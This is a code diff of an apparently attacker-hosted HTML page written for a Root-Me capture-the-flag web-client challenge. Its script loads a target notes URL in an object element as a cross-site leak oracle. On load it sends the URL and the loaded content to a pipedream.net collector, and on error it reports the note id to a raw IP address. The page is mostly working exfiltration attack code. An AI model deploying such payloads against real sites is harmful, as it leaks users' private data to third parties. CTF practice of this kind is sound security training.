@@ -23,52 +23,26 @@
 
     </script> -->
     <script>
-        const leak = async (url) => {
+        const leak = async (url, id) => {
             return new Promise((r) => {
-                let s = document.createElement('script')
-                s.src = url
-
-
-                window.addEventListener('error', (e) => {
-                    s.remove()
-                    console.debug(`window.onerror: ${e.message}`)
+                let s = document.createElement('object')
+                s.data = url
+                s.onload = (e) => {
+                    console.log('Onload event triggered at ' + url);
+                    fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${url}`)
+                    fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${s.innerText}`)
+                    e.target.remove()
                     return r(0)
-                }, { once: true })
-
-                s.onload = s.onerror = async () => {
-                    // wait for error event
-                    await sleep(100)
-                    s.remove()
+                }
+                s.onerror = (e) => {
+                    console.log('Error event triggered');
+                    fetch(`http://91.173.39.199:25565/?error=${id}`)
+                    e.target.remove()
                     return r(1)
                 }
-
-                document.head.appendChild(s)
+                document.body.appendChild(s)
             })
         }
-
-        const sleep = (ms) => {
-            return new Promise(r => setTimeout(r, ms));
-        }
-        // const leak = async (url, id) => {
-        //     return new Promise((r) => {
-        //         let s = document.createElement('object')
-        //         s.data = url
-        //         s.onload = (e) => {
-        //             console.log('Onload event triggered at ' + url);
-        //             fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${url}`)
-        //             fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?url=${s.innerText}`)
-        //             e.target.remove()
-        //             return r(0)
-        //         }
-        //         s.onerror = (e) => {
-        //             console.log('Error event triggered');
-        //             fetch(`http://91.173.39.199:25565/?error=${id}`)
-        //             e.target.remove()
-        //             return r(1)
-        //         }
-        //         document.body.appendChild(s)
-        //     })
-        // }
         // const leak = async (url, id) => {
         //     return new Promise((r) => {
         //         let s = document.createElement('script')
@@ -102,7 +76,7 @@
         //     }
         //     document.head.appendChild(script);
         // }
-        leak(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${3202}`)
+        leak(`https://web-client-ch56.challenge01.root-me.org:58056/notes/${3202}`, 3202)
 
 
     </script>
